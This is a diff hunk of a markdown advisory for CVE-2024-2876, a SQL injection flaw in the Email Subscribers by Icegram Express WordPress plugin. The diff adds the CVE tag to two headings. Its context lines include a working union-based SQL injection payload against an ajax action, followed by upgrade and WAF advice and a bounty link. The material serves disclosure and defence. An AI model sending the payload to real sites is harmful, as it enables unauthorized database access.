@@ -32,10 +32,10 @@ Content-Type: application/x-www-form-urlencoded
 action=tc_csca_get_cities&nonce_ajax={{nonce}}&sid=1+or+0+union+select+concat(0x64617461626173653a,(select%20md5({{num}})),0x7c76657273696f6e3a,(select%20md5({{num}})),0x7c757365723a,user()),2,3--+-
 ```
 
-### How to fix ?
+### How to fix ? for [CVE-2024-2876]
 - Since all versions up to 5.7.14 were detected with the CVE, it’s recommended for users to upgrade the Email Subscribers by Icegram Express plug-in to version 5.7.15 (or the most recent release 5.7.19).
 - Patchstack users have the option to enable automatic updates specifically for vulnerable plugins.
 - Implement a WAF/WAAP solution as an additional layer of protection. The advantage of such solutions is that even if the vulnerability is new and unknown (0-day), it may still prevent attacks by detecting exploitation patterns and techniques.
 
-### Bounty Info 
+### Bounty Info [CVE-2024-2876]
 https://www.wordfence.com/blog/2024/04/1250-bounty-awarded-for-unauthenticated-sql-injection-vulnerability-patched-in-email-subscribers-by-icegram-express-wordpress-plugin/
